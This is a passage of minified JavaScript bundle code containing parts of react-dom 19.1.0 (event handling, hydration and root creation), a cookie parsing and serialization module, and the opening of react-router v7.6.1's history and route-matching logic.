y=rt(m);if(y!==null)switch(y.tag){case 3:if(y=y.stateNode,y.current.memoizedState.isDehydrated){var A=Ai(y.pendingLanes);if(A!==0){var S=y;for(S.pendingLanes|=2,S.entangledLanes|=2;A;){var U=1<<31-rn(A);S.entanglements[1]|=U,A&=~U}Hr(y),(Nt&6)===0&&(Xh=Jn()+500,Iu(0))}}break;case 13:S=bl(y,2),S!==null&&Mi(S,y,2),Jh(),Oy(y,2)}if(y=jy(u),y===null&&xy(r,a,u,pf,l),y===m)break;m=y}m!==null&&u.stopPropagation()}else xy(r,a,u,null,l)}}function jy(r){return r=Qi(r),Ly(r)}var pf=null;function Ly(r){if(pf=null,r=Ve(r),r!==null){var a=o(r);if(a===null)r=null;else{var l=a.tag;if(l===13){if(r=c(a),r!==null)return r;r=null}else if(l===3){if(a.stateNode.current.memoizedState.isDehydrated)return a.tag===3?a.stateNode.containerInfo:null;r=null}else a!==r&&(r=null)}}return pf=r,null}function P1(r){switch(r){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(qc()){case eo:return 2;case Qs:return 8;case rs:case ur:return 32;case Bi:return 268435456;default:return 32}default:return 32}}var Vy=!1,va=null,_a=null,wa=null,Vu=new Map,Uu=new Map,ba=[],U3="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function j1(r,a){switch(r){case"focusin":case"focusout":va=null;break;case"dragenter":case"dragleave":_a=null;break;case"mouseover":case"mouseout":wa=null;break;case"pointerover":case"pointerout":Vu.delete(a.pointerId);break;case"gotpointercapture":case"lostpointercapture":Uu.delete(a.pointerId)}}function Bu(r,a,l,u,m,y){return r===null||r.nativeEvent!==y?(r={blockedOn:a,domEventName:l,eventSystemFlags:u,nativeEvent:y,targetContainers:[m]},a!==null&&(a=rt(a),a!==null&&O1(a)),r):(r.eventSystemFlags|=u,a=r.targetContainers,m!==null&&a.indexOf(m)===-1&&a.push(m),r)}function B3(r,a,l,u,m){switch(a){case"focusin":return va=Bu(va,r,a,l,u,m),!0;case"dragenter":return _a=Bu(_a,r,a,l,u,m),!0;case"mouseover":return wa=Bu(wa,r,a,l,u,m),!0;case"pointerover":var y=m.pointerId;return Vu.set(y,Bu(Vu.get(y)||null,r,a,l,u,m)),!0;case"gotpointercapture":return y=m.pointerId,Uu.set(y,Bu(Uu.get(y)||null,r,a,l,u,m)),!0}return!1}function L1(r){var a=Ve(r.target);if(a!==null){var l=o(a);if(l!==null){if(a=l.tag,a===13){if(a=c(l),a!==null){r.blockedOn=a,W(r.priority,function(){if(l.tag===13){var u=Di();u=Rr(u);var m=bl(l,u);m!==null&&Mi(m,l,u),Oy(l,u)}});return}}else if(a===3&&l.stateNode.current.memoizedState.isDehydrated){r.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}r.blockedOn=null}function gf(r){if(r.blockedOn!==null)return!1;for(var a=r.targetContainers;0<a.length;){var l=jy(r.nativeEvent);if(l===null){l=r.nativeEvent;var u=new l.constructor(l.type,l);cs=u,l.target.dispatchEvent(u),cs=null}else return a=rt(l),a!==null&&O1(a),r.blockedOn=l,!1;a.shift()}return!0}function V1(r,a,l){gf(r)&&l.delete(a)}function z3(){Vy=!1,va!==null&&gf(va)&&(va=null),_a!==null&&gf(_a)&&(_a=null),wa!==null&&gf(wa)&&(wa=null),Vu.forEach(V1),Uu.forEach(V1)}function yf(r,a){r.blockedOn===a&&(r.blockedOn=null,Vy||(Vy=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,z3)))}var vf=null;function U1(r){vf!==r&&(vf=r,t.unstable_scheduleCallback(t.unstable_NormalPriority,function(){vf===r&&(vf=null);for(var a=0;a<r.length;a+=3){var l=r[a],u=r[a+1],m=r[a+2];if(typeof u!="function"){if(Ly(u||l)===null)continue;break}var y=rt(l);y!==null&&(r.splice(a,3),a-=3,Lg(y,{pending:!0,data:m,method:l.method,action:u},u,m))}}))}function zu(r){function a(U){return yf(U,r)}va!==null&&yf(va,r),_a!==null&&yf(_a,r),wa!==null&&yf(wa,r),Vu.forEach(a),Uu.forEach(a);for(var l=0;l<ba.length;l++){var u=ba[l];u.blockedOn===r&&(u.blockedOn=null)}for(;0<ba.length&&(l=ba[0],l.blockedOn===null);)L1(l),l.blockedOn===null&&ba.shift();if(l=(r.ownerDocument||r).$$reactFormReplay,l!=null)for(u=0;u<l.length;u+=3){var m=l[u],y=l[u+1],A=m[pe]||null;if(typeof y=="function")A||U1(l);else if(A){var S=null;if(y&&y.hasAttribute("formAction")){if(m=y,A=y[pe]||null)S=A.formAction;else if(Ly(m)!==null)continue}else S=A.action;typeof S=="function"?l[u+1]=S:(l.splice(u,3),u-=3),U1(l)}}}function Uy(r){this._internalRoot=r}_f.prototype.render=Uy.prototype.render=function(r){var a=this._internalRoot;if(a===null)throw Error(i(409));var l=a.current,u=Di();D1(l,u,r,a,null,null)},_f.prototype.unmount=Uy.prototype.unmount=function(){var r=this._internalRoot;if(r!==null){this._internalRoot=null;var a=r.containerInfo;D1(r.current,2,null,r,null,null),Jh(),a[be]=null}};function _f(r){this._internalRoot=r}_f.prototype.unstable_scheduleHydration=function(r){if(r){var a=H();r={blockedOn:null,target:r,priority:a};for(var l=0;l<ba.length&&a!==0&&a<ba[l].priority;l++);ba.splice(l,0,r),l===0&&L1(r)}};var B1=e.version;if(B1!=="19.1.0")throw Error(i(527,B1,"19.1.0"));me.findDOMNode=function(r){var a=r._reactInternals;if(a===void 0)throw typeof r.render=="function"?Error(i(188)):(r=Object.keys(r).join(","),Error(i(268,r)));return r=f(a),r=r!==null?p(r):null,r=r===null?null:r.stateNode,r};var F3={bundleType:0,version:"19.1.0",rendererPackageName:"react-dom",currentDispatcherRef:ee,reconcilerVersion:"19.1.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var wf=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!wf.isDisabled&&wf.supportsFiber)try{bt=wf.inject(F3),We=wf}catch{}}return Hu.createRoot=function(r,a){if(!s(r))throw Error(i(299));var l=!1,u="",m=nb,y=ib,A=rb,S=null;return a!=null&&(a.unstable_strictMode===!0&&(l=!0),a.identifierPrefix!==void 0&&(u=a.identifierPrefix),a.onUncaughtError!==void 0&&(m=a.onUncaughtError),a.onCaughtError!==void 0&&(y=a.onCaughtError),a.onRecoverableError!==void 0&&(A=a.onRecoverableError),a.unstable_transitionCallbacks!==void 0&&(S=a.unstable_transitionCallbacks)),a=I1(r,1,!1,null,null,l,u,m,y,A,S,null),r[be]=a.current,by(r),new Uy(a)},Hu.hydrateRoot=function(r,a,l){if(!s(r))throw Error(i(299));var u=!1,m="",y=nb,A=ib,S=rb,U=null,J=null;return l!=null&&(l.unstable_strictMode===!0&&(u=!0),l.identifierPrefix!==void 0&&(m=l.identifierPrefix),l.onUncaughtError!==void 0&&(y=l.onUncaughtError),l.onCaughtError!==void 0&&(A=l.onCaughtError),l.onRecoverableError!==void 0&&(S=l.onRecoverableError),l.unstable_transitionCallbacks!==void 0&&(U=l.unstable_transitionCallbacks),l.formState!==void 0&&(J=l.formState)),a=I1(r,1,!0,a,l??null,u,m,y,A,S,U,J),a.context=k1(null),l=a.current,u=Di(),u=Rr(u),m=ra(u),m.callback=null,sa(l,m,u),l=u,a.current.lanes=l,dr(a,l),Hr(a),r[be]=a.current,by(r),new _f(a)},Hu.version="19.1.0",Hu}var $1;function Z3(){if($1)return Fy.exports;$1=1;function t(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(t)}catch(e){console.error(e)}}return t(),Fy.exports=X3(),Fy.exports}var J3=Z3(),qu={},X1;function eI(){if(X1)return qu;X1=1,Object.defineProperty(qu,"__esModule",{value:!0}),qu.parse=c,qu.serialize=p;const t=/^[\u0021-\u003A\u003C\u003E-\u007E]+$/,e=/^[\u0021-\u003A\u003C-\u007E]*$/,n=/^([.]?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)([.][a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/i,i=/^[\u0020-\u003A\u003D-\u007E]*$/,s=Object.prototype.toString,o=(()=>{const w=function(){};return w.prototype=Object.create(null),w})();function c(w,E){const C=new o,M=w.length;if(M<2)return C;const V=(E==null?void 0:E.decode)||v;let B=0;do{const Y=w.indexOf("=",B);if(Y===-1)break;const D=w.indexOf(";",B),Q=D===-1?M:D;if(Y>Q){B=w.lastIndexOf(";",Y-1)+1;continue}const G=d(w,B,Y),L=f(w,Y,G),N=w.slice(G,L);if(C[N]===void 0){let T=d(w,Y+1,Q),k=f(w,Q,T);const I=V(w.slice(T,k));C[N]=I}B=Q+1}while(B<M);return C}function d(w,E,C){do{const M=w.charCodeAt(E);if(M!==32&&M!==9)return E}while(++E<C);return C}function f(w,E,C){for(;E>C;){const M=w.charCodeAt(--E);if(M!==32&&M!==9)return E+1}return C}function p(w,E,C){const M=(C==null?void 0:C.encode)||encodeURIComponent;if(!t.test(w))throw new TypeError(`argument name is invalid: ${w}`);const V=M(E);if(!e.test(V))throw new TypeError(`argument val is invalid: ${E}`);let B=w+"="+V;if(!C)return B;if(C.maxAge!==void 0){if(!Number.isInteger(C.maxAge))throw new TypeError(`option maxAge is invalid: ${C.maxAge}`);B+="; Max-Age="+C.maxAge}if(C.domain){if(!n.test(C.domain))throw new TypeError(`option domain is invalid: ${C.domain}`);B+="; Domain="+C.domain}if(C.path){if(!i.test(C.path))throw new TypeError(`option path is invalid: ${C.path}`);B+="; Path="+C.path}if(C.expires){if(!b(C.expires)||!Number.isFinite(C.expires.valueOf()))throw new TypeError(`option expires is invalid: ${C.expires}`);B+="; Expires="+C.expires.toUTCString()}if(C.httpOnly&&(B+="; HttpOnly"),C.secure&&(B+="; Secure"),C.partitioned&&(B+="; Partitioned"),C.priority)switch(typeof C.priority=="string"?C.priority.toLowerCase():void 0){case"low":B+="; Priority=Low";break;case"medium":B+="; Priority=Medium";break;case"high":B+="; Priority=High";break;default:throw new TypeError(`option priority is invalid: ${C.priority}`)}if(C.sameSite)switch(typeof C.sameSite=="string"?C.sameSite.toLowerCase():C.sameSite){case!0:case"strict":B+="; SameSite=Strict";break;case"lax":B+="; SameSite=Lax";break;case"none":B+="; SameSite=None";break;default:throw new TypeError(`option sameSite is invalid: ${C.sameSite}`)}return B}function v(w){if(w.indexOf("%")===-1)return w;try{return decodeURIComponent(w)}catch{return w}}function b(w){return s.call(w)==="[object Date]"}return qu}eI();/**
 * react-router v7.6.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */var ZE=t=>{throw TypeError(t)},tI=(t,e,n)=>e.has(t)||ZE("Cannot "+n),Yy=(t,e,n)=>(tI(t,e,"read from private field"),n?n.call(t):e.get(t)),nI=(t,e,n)=>e.has(t)?ZE("Cannot add the same private member more than once"):e instanceof WeakSet?e.add(t):e.set(t,n),Z1="popstate";function iI(t={}){function e(i,s){let{pathname:o,search:c,hash:d}=i.location;return pd("",{pathname:o,search:c,hash:d},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function n(i,s){return typeof s=="string"?s:Ua(s)}return sI(e,n,null,t)}function tt(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function $t(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function rI(){return Math.random().toString(36).substring(2,10)}function J1(t,e){return{usr:t.state,key:t.key,idx:e}}function pd(t,e,n=null,i){return{pathname:typeof t=="string"?t:t.pathname,search:"",hash:"",...typeof e=="string"?$a(e):e,state:n,key:e&&e.key||i||rI()}}function Ua({pathname:t="/",search:e="",hash:n=""}){return e&&e!=="?"&&(t+=e.charAt(0)==="?"?e:"?"+e),n&&n!=="#"&&(t+=n.charAt(0)==="#"?n:"#"+n),t}function $a(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substring(n),t=t.substring(0,n));let i=t.indexOf("?");i>=0&&(e.search=t.substring(i),t=t.substring(0,i)),t&&(e.pathname=t)}return e}function sI(t,e,n,i={}){let{window:s=document.defaultView,v5Compat:o=!1}=i,c=s.history,d="POP",f=null,p=v();p==null&&(p=0,c.replaceState({...c.state,idx:p},""));function v(){return(c.state||{idx:null}).idx}function b(){d="POP";let V=v(),B=V==null?null:V-p;p=V,f&&f({action:d,location:M.location,delta:B})}function w(V,B){d="PUSH";let Y=pd(M.location,V,B);p=v()+1;let D=J1(Y,p),Q=M.createHref(Y);try{c.pushState(D,"",Q)}catch(G){if(G instanceof DOMException&&G.name==="DataCloneError")throw G;s.location.assign(Q)}o&&f&&f({action:d,location:M.location,delta:1})}function E(V,B){d="REPLACE";let Y=pd(M.location,V,B);p=v();let D=J1(Y,p),Q=M.createHref(Y);c.replaceState(D,"",Q),o&&f&&f({action:d,location:M.location,delta:0})}function C(V){return JE(V)}let M={get action(){return d},get location(){return t(s,c)},listen(V){if(f)throw new Error("A history only accepts one active listener");return s.addEventListener(Z1,b),f=V,()=>{s.removeEventListener(Z1,b),f=null}},createHref(V){return e(s,V)},createURL:C,encodeLocation(V){let B=C(V);return{pathname:B.pathname,search:B.search,hash:B.hash}},push:w,replace:E,go(V){return c.go(V)}};return M}function JE(t,e=!1){let n="http://localhost";typeof window<"u"&&(n=window.location.origin!=="null"?window.location.origin:window.location.href),tt(n,"No window.location.(origin|href) available to create URL");let i=typeof t=="string"?t:Ua(t);return i=i.replace(/ $/,"%20"),!e&&i.startsWith("//")&&(i=n+i),new URL(i,n)}var Zu,ex=class{constructor(t){if(nI(this,Zu,new Map),t)for(let[e,n]of t)this.set(e,n)}get(t){if(Yy(this,Zu).has(t))return Yy(this,Zu).get(t);if(t.defaultValue!==void 0)return t.defaultValue;throw new Error("No value found for context")}set(t,e){Yy(this,Zu).set(t,e)}};Zu=new WeakMap;var aI=new Set(["lazy","caseSensitive","path","id","index","children"]);function oI(t){return aI.has(t)}var lI=new Set(["lazy","caseSensitive","path","id","index","unstable_middleware","children"]);function cI(t){return lI.has(t)}function uI(t){return t.index===!0}function Wf(t,e,n=[],i={}){return t.map((s,o)=>{let c=[...n,String(o)],d=typeof s.id=="string"?s.id:c.join("-");if(tt(s.index!==!0||!s.children,"Cannot specify children on an index route"),tt(!i[d],`Found a route id collision on id "${d}".  Route id's must be globally unique within Data Router usages`),uI(s)){let f={...s,...e(s),id:d};return i[d]=f,f}else{let f={...s,...e(s),id:d,children:void 0};return i[d]=f,s.children&&(f.children=Wf(s.children,e,c,i)),f}})}function Ta(t,e,n="/"){return Of(t,e,n,!1)}function Of(t,e,n,i){let s=typeof e=="string"?$a(e):e,o=or(s.pathname||"/",n);if(o==null)return null;let c=eT(t);hI(c);let d=null;for(let f=0;d==null&&f<c.length;++f){let p=AI(o);d=bI(c[f],p,i)}return d}function dI(t,e){let{route:n,pathname:i,params:s}=t;return{id:n.id,pathname:i,params:s,data:e[n.id],handle:n.handle}}function eT(t,e=[],n=[],i=""){let s=(o,c,d)=>{let f={relativePath:d===void 0?o.path||"":d,caseSensitive:o.caseSensitive===!0,childrenIndex:c,route:o};f.relativePath.startsWith("/")&&(tt(f.relativePath.startsWith(i),`Absolute route path "${f.relativePath}" nested under path "${i}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),f.relativePath=f.relativePath.slice(i.length));let p=Qr([i,f.relativePath]),v=n.concat(f);o.children&&o.children.length>0&&(tt(o.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${p}".`),eT(o.children,e,v,p)),!(o.path==null&&!o.index)&&e.push({path:p,score:_I(p,o.index),routesMeta:v})};return t.forEach((o,c)=>{var d;if(o.path===""||!((d=o.path)!=null&&d.includes("?")))s(o,c);else for(let f of tT(o.path))s(o,c,f)}),e}function tT(t){let e=t.split("/");if(e.length===0)return[];let[n,...i]=e,s=n.endsWith("?"),o=n.replace(/\?$/,"");if(i.length===0)return s?[o,""]:[o];let c=tT(i.join("/")),d=[];return d.push(...c.map(f=>f===""?o:[o,f].join("/"))),s&&d.push(...c),d.map(f=>t.startsWith("/")&&f===""?"/":f)}function hI(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:wI(e.routesMeta.map(i=>i.childrenIndex),n.routesMeta.map(i=>i.childrenIndex)))}var fI=/^:[\w-]+$/,mI=3,pI=2,gI=1,yI=10,vI=-2,tx=t=>t==="*";function _I(t,e){let n=t.split("/"),i=n.length;return n.some(tx)&&(i+=vI),e&&(i+=pI),n.filter(s=>!tx(s)).reduce((s,o)=>s+(fI.test(o)?mI:o===""?gI:yI),i)}function wI(t,e){return t.length===e.length&&t.slice(0,-1).every((i,s)=>i===e[s])?t[t.length-1]-e[e.length-1]:0}function bI(t,e,n=!1){let{routesMeta:i}=t,s={},o="/",c=[];for(let d=0;d<i.length;++d){let f=i[d],p=d===i.length-1,v=o==="/"?e:e.slice(o.length)||"/",b=$f({path:f.relativePath,caseSensitive:f.caseSensitive,end:p},v),w=f.route;if(!b&&p&&n&&!i[i.length-1].route.index&&(b=$f({path:f.relativePath,caseSensitive:f.caseSensitive,end:!1},v)),!b)return null;Object.assign(s,b.params),c.push({params:s,pathname:Qr([o,b.pathname]),pathnameBase:CI(Qr([o,b.pathnameBase])),route:w}),b.pathnameBase!=="/"&&(o=Qr([o,b.pathnameBase]))}return c}function $f(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,i]=xI(t.path,t.caseSensitive,t.end),s=e.match(n);if(!s)return null;let o=s[0],c=o.replace(/(.)\/+$/,"$1"),d=s.slice(1);return{params:i.reduce((p,{paramName:v,isOptional:b},w)=>{if(v==="*"){let C=d[w]||"";c=o.slice(0,o.length-C.length).replace(/(.)\/+$/,"$1")}const E=d[w];return b&&!E?p[v]=void 0:p[v]=(E||"").replace(/%2F/g,"/"),p},{}),pathname:o,pathnameBase:c,pattern:t}}function xI(t,e=!1,n=!0){$t(t==="*"||!t.endsWith("*")||t.endsWith("/*"),`Route path "${t}" will be treated as if it were "${t.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${t.replace(/\*$/,"/*")}".`);let i=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(c,d,f)=>(i.push({paramName:d,isOptional:f!=null}),f?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(i.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),i]}function AI(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return $t(!1,`The URL path "${t}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),t}}function or(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,i=t.charAt(n);return i&&i!=="/"?null:t.slice(n)||"/"}function EI(t,e="/"){let{pathname:n,search:i="",hash:s=""}=typeof t=="string"?$a(t):t;return{pathname:n?n.startsWith("/")?n:TI(n,e):e,search:SI(i),hash:NI(s)}}function TI(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(s=>{s===".."?n.length>1&&n.pop():s!=="."&&n.push(s)}),n.length>1?n.join("/"):"/"}function Qy(t,e,n,i){return`Cannot include a '${t}' character in a manually specified \`to.${e}\` field [${JSON.stringify(i)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function nT(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function Gm(t){let e=nT(t);return e.map((n,i)=>i===e.length-1?n.pathname:n.pathnameBase)}function Ym(t,e,n,i=!1){let s;typeof t=="string"?s=$a(t):(s={...t},tt(!s.pathname||!s.pathname.includes("?"),Qy("?","pathname","search",s)),tt(!s.pathname||!s.pathname.includes("#"),Qy("#","pathname","hash",s)),tt(!s.search||!s.search.includes("#"),Qy("#","search","hash",s)));let o=t===""||s.pathname==="",c=o?"/":s.pathname,d;if(c==null)d=n;else{let b=e.length-1;if(!i&&c.startsWith("..")){let w=c.split("/");for(;w[0]==="..";)w.shift(),b-=1;s.pathname=w.join("/")}d=b>=0?e[b]:"/"}let f=EI(s,d),p=c&&c!=="/"&&c.endsWith("/"),v=(o||c===".")&&n.endsWith("/");return!f.pathname.endsWith("/")&&(p||v)&&(f.pathname+="/"),f}var Qr=t=>t.join("/").replace(/\/\/+/g,"/"),CI=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),SI=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,NI=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t,Xf=class{constructor(t,e,n,i=!1){this.status=t,this.statusText=e||"",this.internal=i,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}};function gd(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}var iT=["POST","PUT","PATCH","DELETE"],RI=new Set(iT),II=["GET",...iT],kI=new Set(II),DI=new Set([301,302,303,307,308]),MI=new Set([307,308]),Ky={state:"idle",location:void 0,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0,json:void 0,text:void 0},OI={state:"idle",data:void 0,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0,json:void 0,text:void 0},Gu={state:"unblocked",proceed:void 0,reset:void 0,location:void 0},bv=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,PI=t=>({hasErrorBoundary:!!t.hasErrorBoundary}),rT="remix-router-transitions",sT=Symbol("ResetLoaderData");function jI(t){const e=t.window?t.window:typeof window<"u"?window:void 0,n=typeof e<"u"&&typeof e.document<"u"&&typeof e.document.createElement<"u";tt(t.routes.length>0,"You must provide a non-empty routes array to createRouter");let i=t.hydrationRouteProperties||[],s=t.mapRouteProperties||PI,o={},c=Wf(t.routes,s,void 0,o),d,f=t.basename||"/",p=t.dataStrategy||zI,v={unstable_middleware:!1,...t.future},b=null,w=new Set,E=null,C=null,M=null,V=t.hydrationData!=null,B=Ta(c,t.history.location,f),Y=!1,D=null,Q;if(B==null&&!t.patchRoutesOnNavigation){let H=ir(404,{pathname:t.history.location.pathname}),{matches:W,route:Z}=fx(c);Q=!0,B=W,D={[Z.id]:H}}else if(B&&!t.hydrationData&&ei(B,c,t.history.location.pathname).active&&(B=null),B)if(B.some(H=>H.route.lazy))Q=!1;else if(!B.some(H=>H.route.loader))Q=!0;else{let H=t.hydrationData?t.hydrationData.loaderData:null,W=t.hydrationData?t.hydrationData.errors:null;if(W){let Z=B.findIndex(le=>W[le.route.id]!==void 0);Q=B.slice(0,Z+1).every(le=>!w0(le.route,H,W))}else Q=B.every(Z=>!w0(Z.route,H,W))}else{Q=!1,B=[];let H=ei(null,c,t.history.location.pathname);H.active&&H.matches&&(Y=!0,B=H.matches)}let G,L={historyAction:t.history.action,location:t.history.location,matches:B,initialized:Q,navigation:Ky,restoreScrollPosition:t.hydrationData!=null?!1:null,preventScrollReset:!1,revalidation:"idle",loaderData:t.hydrationData&&t.hydrationData.loaderData||{},actionData:t.hydrationData&&t.hydrationData.actionData||null,errors:t.hydrationData&&t.hydrationData.errors||D,fetchers:new Map,blockers:new Map},N="POP",T=!1,k,I=!1,j=new Map,z=null,P=!1,Ne=!1,Me=new Set,ee=new Map,me=0,we=-1,Be=new Map,F=new Set,ae=new Map,ge=new Map,ue=new Set,Te=new Map,_e,he=null;function it(){if(b=t.history.listen(({action:H,location:W,delta:Z})=>{if(_e){_e(),_e=void 0;return}$t(Te.size===0||Z!=null,"You are trying to use a blocker on a POP navigation to a location that was not created by @remix-run/router. This will fail silently in production. This can happen if you are navigating outside the router via `window.history.pushState`/`window.location.hash` instead of using router navigation APIs.  This can also happen if you are using createHashRouter and the user manually changes the URL.");let le=$s({currentLocation:L.location,nextLocation:W,historyAction:H});if(le&&Z!=null){let pe=new Promise(be=>{_e=be});t.history.go(Z*-1),Fi(le,{state:"blocked",location:W,proceed(){Fi(le,{state:"proceeding",proceed:void 0,reset:void 0,location:W}),pe.then(()=>t.history.go(Z))},reset(){let be=new Map(L.blockers);be.set(le,Gu),Ft({blockers:be})}});return}return Zn(H,W)}),n){ZI(e,j);let H=()=>JI(e,j);e.addEventListener("pagehide",H),z=()=>e.removeEventListener("pagehide",H)}return L.initialized||Zn("POP",L.location,{initialHydration:!0}),G}function gt(){b&&b(),z&&z(),w.clear(),k&&k.abort(),L.fetchers.forEach((H,W)=>rn(W)),L.blockers.forEach((H,W)=>ss(W))}function xi(H){return w.add(H),()=>w.delete(H)}function Ft(H,W={}){L={...L,...H};let Z=[],le=[];L.fetchers.forEach((pe,be)=>{pe.state==="idle"&&(ue.has(be)?Z.push(be):le.push(be))}),ue.forEach(pe=>{!L.fetchers.has(pe)&&!ee.has(pe)&&Z.push(pe)}),[...w].forEach(pe=>pe(L,{deletedFetchers:Z,viewTransitionOpts:W.viewTransitionOpts,flushSync:W.flushSync===!0})),Z.forEach(pe=>rn(pe)),le.forEach(pe=>L.fetchers.delete(pe))}function Fn(H,W,{flushSync:Z}={}){var Re,je;let le=L.actionData!=null&&L.navigation.formMethod!=null&&Pi(L.navigation.formMethod)&&L.navigation.state==="loading"&&((Re=H.state)==null?void 0:Re._isRedirect)!==!0,pe;W.actionData?Object.keys(W.actionData).length>0?pe=W.actionData:pe=null:le?pe=L.actionData:pe=null;let be=W.loaderData?dx(L.loaderData,W.loaderData,W.matches||[],W.errors):L.loaderData,De=L.blockers;De.size>0&&(De=new Map(De),De.forEach((Se,Ve)=>De.set(Ve,Gu)));let Ae=T===!0||L.navigation.formMethod!=null&&Pi(L.navigation.formMethod)&&((je=H.state)==null?void 0:je._isRedirect)!==!0;d&&(c=d,d=void 0),P||N==="POP"||(N==="PUSH"?t.history.push(H,H.state):N==="REPLACE"&&t.history.replace(H,H.state));let Ce;if(N==="POP"){let Se=j.get(L.location.pathname);Se&&Se.has(H.pathname)?Ce={currentLocation:L.location,nextLocation:H}:j.has(H.pathname)&&(Ce={currentLocation:H,nextLocation:L.location})}else if(I){let Se=j.get(L.location.pathname);Se?Se.add(H.pathname):(Se=new Set([H.pathname]),j.set(L.location.pathname,Se)),Ce={currentLocation:L.location,nextLocation:H}}Ft({...W,actionData:pe,loaderData:be,historyAction:N,location:H,initialized:!0,navigation:Ky,revalidation:"idle",restoreScrollPosition:Xs(H,W.matches||L.matches),preventScrollReset:Ae,blockers:De},{viewTransitionOpts:Ce,flushSync:Z===!0}),N="POP",T=!1,I=!1,P=!1,Ne=!1,he==null||he.resolve(),he=null}async function Er(H,W){if(typeof H=="number"){t.history.go(H);return}let Z=_0(L.location,L.matches,f,H,W==null?void 0:W.fromRouteId,W==null?void 0:W.relative),{path:le,submission:pe,error:be}=nx(!1,Z,W),De=L.location,Ae=pd(L.location,le,W&&W.state);Ae={...Ae,...t.history.encodeLocation(Ae)};let Ce=W&&W.replace!=null?W.replace:void 0,Re="PUSH";Ce===!0?Re="REPLACE":Ce===!1||pe!=null&&Pi(pe.formMethod)&&pe.formAction===L.location.pathname+L.location.search&&(Re="REPLACE");let je=W&&"preventScrollReset"in W?W.preventScrollReset===!0:void 0,Se=(W&&W.flushSync)===!0,Ve=$s({currentLocation:De,nextLocation:Ae,historyAction:Re});if(Ve){Fi(Ve,{state:"blocked",location:Ae,proceed(){Fi(Ve,{state:"proceeding",proceed:void 0,reset:void 0,location:Ae}),Er(H,W)},reset(){let rt=new Map(L.blockers);rt.set(Ve,Gu),Ft({blockers:rt})}});return}await Zn(Re,Ae,{submission:pe,pendingError:be,preventScrollReset:je,replace:W&&W.replace,enableViewTransition:W&&W.viewTransition,flushSync:Se})}function is(){he||(he=e6()),Ws(),Ft({revalidation:"loading"});let H=he.promise;return L.navigation.state==="submitting"?H:L.navigation.state==="idle"?(Zn(L.historyAction,L.location,{startUninterruptedRevalidation:!0}),H):(Zn(N||L.historyAction,L.navigation.location,{overrideNavigation:L.navigation,enableViewTransition:I===!0}),H)}async function Zn(H,W,Z){k&&k.abort(),k=null,N=H,P=(Z&&Z.startUninterruptedRevalidation)===!0,dr(L.location,L.matches),T=(Z&&Z.preventScrollReset)===!0,I=(Z&&Z.enableViewTransition)===!0;let 